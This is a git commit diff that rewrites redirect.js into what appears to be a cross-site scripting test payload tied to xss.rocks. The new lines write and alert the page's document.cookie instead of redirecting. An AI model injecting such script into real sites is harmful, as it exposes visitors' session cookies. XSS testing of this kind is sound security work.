7aabc15ef6e5ddee909aa33256095b47c73abab5
bobthehacker101 <75433097+bobthehacker101@users.noreply.github.com>
2020-12-03 15:06:31 +0100

    Update redirect.js

--- redirect.js
+++ redirect.js
@@ -1,1 +1,2 @@
-window.open("http://www.w3schools.com");
+document.write ("This is remote text via xss.js located at xss.rocks " + document.cookie);
+alert ("This is remote text via xss.js located at xss.rocks " + document.cookie);
